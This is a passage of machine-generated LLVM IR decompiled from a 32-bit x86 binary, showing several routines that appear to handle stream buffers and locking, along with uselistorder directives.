dec_label_pc_804cb6e:                             ; preds = %dec_label_pc_804cb5d
  %v0_804cb6e = load i32, i32* @esi, align 4
  %v1_804cb6e = add i32 %v0_804cb6e, 1
  store i32 %v1_804cb6e, i32* %eax.global-to-local, align 4
  %v2_804cb71 = inttoptr i32 %v0_804cb68 to i32*
  store i32 %v1_804cb6e, i32* %v2_804cb71, align 4
  br label %dec_label_pc_804cb88

dec_label_pc_804cb75:                             ; preds = %dec_label_pc_804cb5d
  store i32 %v4_804c7dc, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804cb7d = load i32, i32* @esi, align 4
  %v2_804cb7d = sub i32 %v0_804cb7d, %v4_804c7dc
  store i32 %v2_804cb7d, i32* %esi.global-to-local, align 4
  %v1_804cb7f = mul i32 %v2_804cb7d, 4
  %v2_804cb7f = add i32 %v1_804cb7f, 224
  store i32 %v2_804cb7f, i32* %eax.global-to-local, align 4
  %v2_804cb86 = load i32, i32* %arg1, align 4
  %v4_804cb86 = add i32 %v2_804cb86, %v2_804cb7f
  store i32 %v4_804cb86, i32* %arg1, align 4
  br label %dec_label_pc_804cb88

dec_label_pc_804cb88:                             ; preds = %dec_label_pc_804cb6e, %dec_label_pc_804cb75
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cb8c = add i32 %tmp76, 28
  %v2_804cb8c = inttoptr i32 %v1_804cb8c to i32*
  %v3_804cb8c = load i32, i32* %v2_804cb8c, align 4
  store i32 %v3_804cb8c, i32* %eax.global-to-local, align 4
  %v1_804cb8f = add i32 %v3_804cb8c, 2
  br label %dec_label_pc_804cb97

dec_label_pc_804cb94:                             ; preds = %dec_label_pc_804c82d, %dec_label_pc_804c8c7, %dec_label_pc_804c8fa, %dec_label_pc_804c975, %dec_label_pc_804c961, %dec_label_pc_804c958, %dec_label_pc_804cad4, %dec_label_pc_804ca8b, %dec_label_pc_804c9d7
  br label %dec_label_pc_804cb97

dec_label_pc_804cb97:                             ; preds = %dec_label_pc_804cb88, %dec_label_pc_804cb94
  %storemerge6 = phi i32 [ %v1_804cb8f, %dec_label_pc_804cb88 ], [ -1, %dec_label_pc_804cb94 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804cb9a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cb9a, i32* @ebx, align 4
  store i32 %v0_804c7db, i32* @esi, align 4
  store i32 %v0_804c7da, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804cb26, { 0, 2, 1 }
  uselistorder i32 %v1_804cae1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804cad4, { 1, 0 }
  uselistorder i32 %v5_804cace, { 1, 2, 0 }
  uselistorder i32 %v0_804cae1, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804caaf, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804cac5, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804ca40, { 1, 2, 0 }
  uselistorder i32 %v1_804ca16, { 1, 2, 0 }
  uselistorder i32 %v0_804ca40, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804c9db, { 1, 0 }
  uselistorder i32 %v1_804c9ca, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804c9d3, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804c9bd, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804c9b3, { 1, 0 }
  uselistorder i32 %v1_804c995, { 1, 0 }
  uselistorder i32 %v0_804c9b3.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804c978, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804c96f, { 1, 2, 0 }
  uselistorder i32 %v0_804c935, { 1, 0 }
  uselistorder i32 %v1_804c927, { 1, 0 }
  uselistorder i32 %v1_804c922, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804c920, { 2, 0, 1 }
  uselistorder i32 %v0_804c942, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804c8dd, { 1, 2, 0 }
  uselistorder i32 %v0_804c8b5, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804c8a8.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804c8a1.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804c8ab, { 1, 2, 0 }
  uselistorder i32 %v6_804c8a9, { 0, 2, 1 }
  uselistorder i32 %v1_804c8a8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804c8a1, { 2, 1, 0 }
  uselistorder i32 %v1_804c899, { 1, 0 }
  uselistorder i32 %v1_804c8a1137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804c891, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804c884, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804c87f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804c855, { 0, 2, 1 }
  uselistorder i32 %v2_804c844, { 1, 0 }
  uselistorder i32 %v0_804c842, { 2, 0, 1 }
  uselistorder i32 %v4_804c7dc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 0, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @function_804c7b0, { 1, 0 }
  uselistorder i32 -9, { 1, 0, 2 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134559511, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8053721.129 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804cb97, { 1, 0 }
  uselistorder label %dec_label_pc_804cb94, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cb88, { 1, 0 }
  uselistorder label %dec_label_pc_804cb5d, { 1, 0 }
  uselistorder label %dec_label_pc_804cb22, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cace, { 1, 0 }
  uselistorder label %dec_label_pc_804caa2, { 1, 0 }
  uselistorder label %dec_label_pc_804ca0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c9d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c9ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c985, { 1, 0 }
  uselistorder label %dec_label_pc_804c94c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804c8ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c8a8, { 1, 0 }
  uselistorder label %dec_label_pc_804c899, { 1, 0 }
  uselistorder label %dec_label_pc_804c88f, { 1, 0 }
  uselistorder label %dec_label_pc_804c878, { 1, 0 }
  uselistorder label %dec_label_pc_804c878.outer, { 2, 0, 1 }
}

define i32 @function_804cba0(i32* %arg1) local_unnamed_addr {
dec_label_pc_804cba0:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804cba3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804cbaa = add i32 %tmp5, 52
  %v2_804cbaa = inttoptr i32 %v1_804cbaa to i32*
  %v3_804cbaa = load i32, i32* %v2_804cbaa, align 4
  %v1_804cbad = icmp eq i32 %v3_804cbaa, 0
  %v1_804cbaf = icmp eq i1 %v1_804cbad, false
  br i1 %v1_804cbaf, label %dec_label_pc_804cbd0.thread, label %dec_label_pc_804cbd6

dec_label_pc_804cbd0.thread:                      ; preds = %dec_label_pc_804cba0
  %v2_804cbd016 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804cbe7

dec_label_pc_804cbd6:                             ; preds = %dec_label_pc_804cba0
  %v1_804cbb1 = add i32 %tmp5, 56
  store i32 %v12_804cba3, i32* @eax, align 4
  %v2_804cbc0 = call i32 @function_804f2ae(i32 %v12_804cba3, i32 134541995)
  %v1_804cbc8 = call i32 @function_804f2ab(i32 %v1_804cbb1)
  %v0_804cbd0.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804cbd0 = inttoptr i32 %v0_804cbd0.pre to i32*
  %v2_804cbd0 = load i32, i32* %v1_804cbd0, align 4
  store i32 %v12_804cba3, i32* @eax, align 4
  %v2_804cbdf = call i32 @function_804f2ae(i32 %v12_804cba3, i32 1)
  br label %dec_label_pc_804cbe7

dec_label_pc_804cbe7:                             ; preds = %dec_label_pc_804cbd0.thread, %dec_label_pc_804cbd6
  %v0_804cbe7 = phi i32 [ %v2_804cbd0, %dec_label_pc_804cbd6 ], [ %v2_804cbd016, %dec_label_pc_804cbd0.thread ]
  %v1_804cbec = and i32 %v0_804cbe7, 4
  ret i32 %v1_804cbec

; uselistorder directives
  uselistorder i32 %v12_804cba3, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804cbe7, { 1, 0 }
}

define i32 @function_804cbf4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cbf4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cbf4 = load i32, i32* @edi, align 4
  %v0_804cbf5 = load i32, i32* @esi, align 4
  %v0_804cbf6 = load i32, i32* @ebx, align 4
  %v12_804cbf7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804cbfe = add i32 %arg3, 52
  %v2_804cbfe = inttoptr i32 %v1_804cbfe to i32*
  %v3_804cbfe = load i32, i32* %v2_804cbfe, align 4
  store i32 %v3_804cbfe, i32* @edi, align 4
  %v1_804cc01 = icmp eq i32 %v3_804cbfe, 0
  %v1_804cc03 = icmp eq i1 %v1_804cc01, false
  br i1 %v1_804cc03, label %dec_label_pc_804cbf4.dec_label_pc_804cc24_crit_edge, label %dec_label_pc_804cc05

dec_label_pc_804cbf4.dec_label_pc_804cc24_crit_edge: ; preds = %dec_label_pc_804cbf4
  br label %dec_label_pc_804cc24

dec_label_pc_804cc05:                             ; preds = %dec_label_pc_804cbf4
  %v1_804cc05 = add i32 %arg3, 56
  store i32 %v1_804cc05, i32* @ebx, align 4
  store i32 %v12_804cbf7, i32* @eax, align 4
  %v2_804cc14 = call i32 @function_804f2ae(i32 %v12_804cbf7, i32 134541995)
  %v0_804cc19 = load i32, i32* @ebx, align 4
  %v1_804cc1c = call i32 @function_804f2ab(i32 %v0_804cc19)
  %v0_804cc25.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cc24

dec_label_pc_804cc24:                             ; preds = %dec_label_pc_804cbf4.dec_label_pc_804cc24_crit_edge, %dec_label_pc_804cc05
  %v0_804cc25 = phi i32 [ %arg3, %dec_label_pc_804cbf4.dec_label_pc_804cc24_crit_edge ], [ %v0_804cc25.pre, %dec_label_pc_804cc05 ]
  %v0_804cc24 = load i32, i32* @edx, align 4
  %v4_804cc2e = inttoptr i32 %arg1 to i8*
  %v5_804cc2e = call i32 @function_804cf74(i8* %v4_804cc2e, i32 %arg2, i32 %v0_804cc25, i32 %v0_804cc24)
  store i32 %v5_804cc2e, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cc03, label %dec_label_pc_804cc4d, label %dec_label_pc_804cc3c

dec_label_pc_804cc3c:                             ; preds = %dec_label_pc_804cc24
  store i32 %v12_804cbf7, i32* @eax, align 4
  %v2_804cc45 = call i32 @function_804f2ae(i32 %v12_804cbf7, i32 1)
  %v0_804cc50.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cc4d

dec_label_pc_804cc4d:                             ; preds = %dec_label_pc_804cc24, %dec_label_pc_804cc3c
  %v0_804cc50 = phi i32 [ %v5_804cc2e, %dec_label_pc_804cc24 ], [ %v0_804cc50.pre, %dec_label_pc_804cc3c ]
  store i32 %v0_804cbf6, i32* @ebx, align 4
  store i32 %v0_804cbf5, i32* @esi, align 4
  store i32 %v0_804cbf4, i32* @edi, align 4
  ret i32 %v0_804cc50

; uselistorder directives
  uselistorder i32 %v12_804cbf7, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cc4d, { 1, 0 }
  uselistorder label %dec_label_pc_804cc24, { 1, 0 }
}

define i32 @function_804cc58(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804cc58:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cc58 = load i32, i32* @edi, align 4
  %v0_804cc59 = load i32, i32* @esi, align 4
  %v0_804cc5a = load i32, i32* @ebx, align 4
  %v12_804cc5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_804cc62 = sext i8 %arg1 to i32
  store i32 %v4_804cc62, i32* @edi, align 4
  %v1_804cc66 = add i32 %arg2, 52
  %v2_804cc66 = inttoptr i32 %v1_804cc66 to i32*
  %v3_804cc66 = load i32, i32* %v2_804cc66, align 4
  %v4_804cc66 = icmp eq i32 %v3_804cc66, 0
  br i1 %v4_804cc66, label %dec_label_pc_804cc8e, label %dec_label_pc_804cc6c

dec_label_pc_804cc6c:                             ; preds = %dec_label_pc_804cc58
  %v1_804cc6c = add i32 %arg2, 16
  %v2_804cc6c = inttoptr i32 %v1_804cc6c to i32*
  %v3_804cc6c = load i32, i32* %v2_804cc6c, align 4
  store i32 %v3_804cc6c, i32* %eax.global-to-local, align 4
  %v2_804cc6f = add i32 %arg2, 28
  %v3_804cc6f = inttoptr i32 %v2_804cc6f to i32*
  %v4_804cc6f = load i32, i32* %v3_804cc6f, align 4
  %v10_804cc6f = icmp ult i32 %v3_804cc6c, %v4_804cc6f
  %v1_804cc72 = icmp eq i1 %v10_804cc6f, false
  br i1 %v1_804cc72, label %dec_label_pc_804cc81, label %dec_label_pc_804cc74

dec_label_pc_804cc74:                             ; preds = %dec_label_pc_804cc6c
  store i32 %v4_804cc62, i32* @edx, align 4
  %v3_804cc76 = inttoptr i32 %v3_804cc6c to i8*
  store i8 %arg1, i8* %v3_804cc76, align 1
  %v0_804cc78 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc78 = add i32 %v0_804cc78, 1
  store i32 %v1_804cc78, i32* %eax.global-to-local, align 4
  %v0_804cc79 = load i32, i32* @edx, align 4
  %v1_804cc79 = urem i32 %v0_804cc79, 256
  store i32 %v1_804cc79, i32* %ebx.global-to-local, align 4
  %v1_804cc7c = load i32, i32* @esi, align 4
  %v2_804cc7c = add i32 %v1_804cc7c, 16
  %v3_804cc7c = inttoptr i32 %v2_804cc7c to i32*
  store i32 %v1_804cc78, i32* %v3_804cc7c, align 4
  br label %dec_label_pc_804cce1

dec_label_pc_804cc81:                             ; preds = %dec_label_pc_804cc6c
  %v4_804cc85 = call i32 @function_804cfe0(i8 %arg1, i32 %arg2)
  store i32 %v4_804cc85, i32* %eax.global-to-local, align 4
  store i32 %v4_804cc85, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ccde

dec_label_pc_804cc8e:                             ; preds = %dec_label_pc_804cc58
  %v1_804cc8e = add i32 %arg2, 56
  store i32 %v1_804cc8e, i32* @ebx, align 4
  store i32 %v12_804cc5b, i32* @eax, align 4
  %sext = mul i32 %v12_804cc5b, 16777216
  %v1_804cc9d = sdiv i32 %sext, 16777216
  %v3_804cc9d = call i32 @function_804f2ae(i32 %v1_804cc9d, i32 134541995)
  store i32 %v3_804cc9d, i32* %eax.global-to-local, align 4
  %v0_804cca2 = load i32, i32* @ebx, align 4
  %sext3 = mul i32 %v0_804cca2, 16777216
  %v1_804cca5 = sdiv i32 %sext3, 16777216
  %v2_804cca5 = call i32 @function_804f2ab(i32 %v1_804cca5)
  store i32 %v2_804cca5, i32* %eax.global-to-local, align 4
  %v0_804ccaa = load i32, i32* @esi, align 4
  %v1_804ccaa = add i32 %v0_804ccaa, 16
  %v2_804ccaa = inttoptr i32 %v1_804ccaa to i32*
  %v3_804ccaa = load i32, i32* %v2_804ccaa, align 4
  store i32 %v3_804ccaa, i32* %eax.global-to-local, align 4
  %v2_804ccb0 = add i32 %v0_804ccaa, 28
  %v3_804ccb0 = inttoptr i32 %v2_804ccb0 to i32*
  %v4_804ccb0 = load i32, i32* %v3_804ccb0, align 4
  %v10_804ccb0 = icmp ult i32 %v3_804ccaa, %v4_804ccb0
  %v1_804ccb3 = icmp eq i1 %v10_804ccb0, false
  %v0_804ccc5 = load i32, i32* @edi, align 4
  br i1 %v1_804ccb3, label %dec_label_pc_804ccc2, label %dec_label_pc_804ccb5

dec_label_pc_804ccb5:                             ; preds = %dec_label_pc_804cc8e
  store i32 %v0_804ccc5, i32* @edx, align 4
  %v1_804ccb7 = trunc i32 %v0_804ccc5 to i8
  %v3_804ccb7 = inttoptr i32 %v3_804ccaa to i8*
  store i8 %v1_804ccb7, i8* %v3_804ccb7, align 1
  %v0_804ccb9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ccb9 = add i32 %v0_804ccb9, 1
  store i32 %v1_804ccb9, i32* %eax.global-to-local, align 4
  %v0_804ccba = load i32, i32* @edx, align 4
  %v1_804ccba = urem i32 %v0_804ccba, 256
  store i32 %v1_804ccba, i32* %ebx.global-to-local, align 4
  %v1_804ccbd = load i32, i32* @esi, align 4
  %v2_804ccbd = add i32 %v1_804ccbd, 16
  %v3_804ccbd = inttoptr i32 %v2_804ccbd to i32*
  store i32 %v1_804ccb9, i32* %v3_804ccbd, align 4
  br label %dec_label_pc_804ccd0

dec_label_pc_804ccc2:                             ; preds = %dec_label_pc_804cc8e
  %v5_804ccc5 = trunc i32 %v0_804ccc5 to i8
  %v4_804ccc6 = call i32 @function_804cfe0(i8 %v5_804ccc5, i32 %v0_804ccaa)
  store i32 %v4_804ccc6, i32* %eax.global-to-local, align 4
  store i32 %v4_804ccc6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ccd0

dec_label_pc_804ccd0:                             ; preds = %dec_label_pc_804ccb5, %dec_label_pc_804ccc2
  store i32 %v12_804cc5b, i32* @eax, align 4
  %v3_804ccd9 = call i32 @function_804f2ae(i32 %v1_804cc9d, i32 1)
  store i32 %v3_804ccd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ccde

dec_label_pc_804ccde:                             ; preds = %dec_label_pc_804cc81, %dec_label_pc_804ccd0
  br label %dec_label_pc_804cce1

dec_label_pc_804cce1:                             ; preds = %dec_label_pc_804cc74, %dec_label_pc_804ccde
  %v0_804cce4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804cce4, i32* %eax.global-to-local, align 4
  store i32 %v0_804cc5a, i32* @ebx, align 4
  store i32 %v0_804cc59, i32* @esi, align 4
  store i32 %v0_804cc58, i32* @edi, align 4
  ret i32 %v0_804cce4

; uselistorder directives
  uselistorder i32 %v0_804ccc5, { 2, 1, 0 }
  uselistorder i32 %v1_804cc9d, { 1, 0 }
  uselistorder i32 %v12_804cc5b, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804cce1, { 1, 0 }
  uselistorder label %dec_label_pc_804ccde, { 1, 0 }
  uselistorder label %dec_label_pc_804ccd0, { 1, 0 }
}

define i32 @function_804cd4c() local_unnamed_addr {
dec_label_pc_804cd4c:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cd5b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cd5b, i32* @eax, align 4
  %v2_804cd60 = call i32 @function_804f2ae(i32 %v2_804cd5b, i32 134541995)
  %v1_804cd6c = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  %v0_804cd71 = load i32, i32* @global_var_8056520.109, align 32
  %v8_804cd79 = icmp eq i32 %v0_804cd71, 1
  %v1_804cd7a = icmp eq i1 %v8_804cd79, false
  br i1 %v1_804cd7a, label %dec_label_pc_804ce11, label %dec_label_pc_804cd80

dec_label_pc_804cd80:                             ; preds = %dec_label_pc_804cd4c
  %v0_804cd80 = load i32, i32* @global_var_8056524.110, align 4
  %tmp29 = icmp slt i32 %v0_804cd80, 1
  br i1 %tmp29, label %dec_label_pc_804ce11, label %dec_label_pc_804cd8d

dec_label_pc_804cd8d:                             ; preds = %dec_label_pc_804cd80
  store i32 0, i32* @esi, align 4
  %v2_804cd9a = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cd9a, i32* @eax, align 4
  %v2_804cd9f = call i32 @function_804f2ae(i32 %v2_804cd9a, i32 134541995)
  %v1_804cdab = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e40.117 to i32))
  %v0_804cdb0 = load i32, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  store i32 %v0_804cdb0, i32* %edx.global-to-local, align 4
  %v1_804cdf23 = icmp eq i32 %v0_804cdb0, 0
  %v1_804cdf410 = icmp eq i1 %v1_804cdf23, false
  br i1 %v1_804cdf410, label %dec_label_pc_804cdbb, label %dec_label_pc_804cdf6

dec_label_pc_804cdbb:                             ; preds = %dec_label_pc_804cd8d, %dec_label_pc_804cdf0
  %v0_804cdcb = phi i32 [ %v0_804cdf0, %dec_label_pc_804cdf0 ], [ %v0_804cdb0, %dec_label_pc_804cd8d ]
  %v1_804cdbb13 = inttoptr i32 %v0_804cdcb to i16*
  %v2_804cdbb = load i16, i16* %v1_804cdbb13, align 2
  %v1_804cdc3 = add i32 %v0_804cdcb, 32
  %v2_804cdc3 = inttoptr i32 %v1_804cdc3 to i32*
  %v3_804cdc3 = load i32, i32* %v2_804cdc3, align 4
  store i32 %v3_804cdc3, i32* @ebx, align 4
  %v1_804cdbe = and i16 %v2_804cdbb, -32720
  %v6_804cdc6 = icmp eq i16 %v1_804cdbe, 48
  br i1 %v6_804cdc6, label %dec_label_pc_804cdcf, label %dec_label_pc_804cdcb

dec_label_pc_804cdcb:                             ; preds = %dec_label_pc_804cdbb
  store i32 %v0_804cdcb, i32* @esi, align 4
  br label %dec_label_pc_804cdf0

dec_label_pc_804cdcf:                             ; preds = %dec_label_pc_804cdbb
  %v0_804cdcf = load i32, i32* @esi, align 4
  %v1_804cdcf = icmp eq i32 %v0_804cdcf, 0
  %v1_804cdd1 = icmp eq i1 %v1_804cdcf, false
  br i1 %v1_804cdd1, label %dec_label_pc_804cddb, label %dec_label_pc_804cdd3

dec_label_pc_804cdd3:                             ; preds = %dec_label_pc_804cdcf
  store i32 %v3_804cdc3, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  br label %dec_label_pc_804cdde

dec_label_pc_804cddb:                             ; preds = %dec_label_pc_804cdcf
  %v2_804cddb = add i32 %v0_804cdcf, 32
  %v3_804cddb = inttoptr i32 %v2_804cddb to i32*
  store i32 %v3_804cdc3, i32* %v3_804cddb, align 4
  %v0_804cdde.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cdde

dec_label_pc_804cdde:                             ; preds = %dec_label_pc_804cdd3, %dec_label_pc_804cddb
  %v0_804cde7 = phi i32 [ %v0_804cdcb, %dec_label_pc_804cdd3 ], [ %v0_804cdde.pre, %dec_label_pc_804cddb ]
  %v1_804cdde = add i32 %v0_804cde7, 1
  %v2_804cdde = inttoptr i32 %v1_804cdde to i8*
  %v3_804cdde = load i8, i8* %v2_804cdde, align 1
  %v4_804cdde = and i8 %v3_804cdde, 32
  %v5_804cdde = icmp eq i8 %v4_804cdde, 0
  br i1 %v5_804cdde, label %dec_label_pc_804cdf0, label %dec_label_pc_804cde4

dec_label_pc_804cde4:                             ; preds = %dec_label_pc_804cdde
  %v1_804cde8 = call i32 @function_804e725(i32 %v0_804cde7)
  br label %dec_label_pc_804cdf0

dec_label_pc_804cdf0:                             ; preds = %dec_label_pc_804cdde, %dec_label_pc_804cdcb, %dec_label_pc_804cde4
  %v0_804cdf0 = load i32, i32* @ebx, align 4
  store i32 %v0_804cdf0, i32* %edx.global-to-local, align 4
  %v1_804cdf2 = icmp eq i32 %v0_804cdf0, 0
  %v1_804cdf4 = icmp eq i1 %v1_804cdf2, false
  br i1 %v1_804cdf4, label %dec_label_pc_804cdbb, label %dec_label_pc_804cdf6

dec_label_pc_804cdf6:                             ; preds = %dec_label_pc_804cdf0, %dec_label_pc_804cd8d
  store i32 %v2_804cd9a, i32* @eax, align 4
  %v2_804cdff = call i32 @function_804f2ae(i32 %v2_804cd9a, i32 1)
  store i32 0, i32* @global_var_8056524.110, align 4
  %v0_804ce11.pre = load i32, i32* @global_var_8056520.109, align 32
  br label %dec_label_pc_804ce11

dec_label_pc_804ce11:                             ; preds = %dec_label_pc_804cd80, %dec_label_pc_804cd4c, %dec_label_pc_804cdf6
  %v0_804ce11 = phi i32 [ %v0_804cd71, %dec_label_pc_804cd80 ], [ %v0_804cd71, %dec_label_pc_804cd4c ], [ %v0_804ce11.pre, %dec_label_pc_804cdf6 ]
  %v1_804ce16 = add i32 %v0_804ce11, -1
  store i32 %v1_804ce16, i32* @global_var_8056520.109, align 32
  store i32 %v2_804cd5b, i32* @eax, align 4
  %v2_804ce25 = call i32 @function_804f2ae(i32 %v2_804cd5b, i32 1)
  ret i32 %v2_804ce25

; uselistorder directives
  uselistorder i32 %v0_804cdf0, { 1, 2, 0 }
  uselistorder i32 %v0_804cdcb, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804cd71, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ce11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdde, { 1, 0 }
  uselistorder label %dec_label_pc_804cdbb, { 1, 0 }
}

define i32 @function_804ce30(i16* %arg1) local_unnamed_addr {
dec_label_pc_804ce30:
  %stack_var_-32 = alloca i32, align 4
  %v0_804ce30 = load i32, i32* @ebp, align 4
  %v0_804ce31 = load i32, i32* @edi, align 4
  %v0_804ce32 = load i32, i32* @esi, align 4
  %v0_804ce33 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804ce39 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ce39, i32* @ebx, align 4
  %v10_804ce3d = icmp eq i16* %arg1, inttoptr (i32 134569532 to i16*)
  br i1 %v10_804ce3d, label %dec_label_pc_804ce52, label %dec_label_pc_804ce45

dec_label_pc_804ce45:                             ; preds = %dec_label_pc_804ce30
  store i32 256, i32* @ebp, align 4
  %v2_804ce4a = icmp eq i16* %arg1, null
  %v1_804ce4c = icmp eq i1 %v2_804ce4a, false
  br i1 %v1_804ce4c, label %dec_label_pc_804cf41, label %dec_label_pc_804ce52

dec_label_pc_804ce52:                             ; preds = %dec_label_pc_804ce45, %dec_label_pc_804ce30
  store i32 0, i32* @edi, align 4
  %v2_804ce5f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ce5f, i32* @ebx, align 4
  %v2_804ce64 = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 134541995)
  %v1_804ce70 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  store i32 ptrtoint (i32* @global_var_8055e58.108 to i32), i32* @ecx, align 4
  %v0_804ce76 = load i32, i32* @global_var_8056520.109, align 32
  %v1_804ce7c = add i32 %v0_804ce76, 1
  store i32 %v1_804ce7c, i32* @eax, align 4
  store i32 %v1_804ce7c, i32* @global_var_8056520.109, align 32
  %v2_804ce85 = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 1)
  store i32 %v2_804ce85, i32* @eax, align 4
  %v2_804ce98 = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 134541995)
  %v1_804cea4 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e40.117 to i32))
  store i32 ptrtoint (i32* @global_var_8055e40.117 to i32), i32* @eax, align 4
  %v0_804cead = load i32, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  store i32 %v0_804cead, i32* @esi, align 4
  %v2_804ceb4 = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 1)
  %v0_804cf361 = load i32, i32* @esi, align 4
  %v1_804cf362 = icmp eq i32 %v0_804cf361, 0
  %v1_804cf389 = icmp eq i1 %v1_804cf362, false
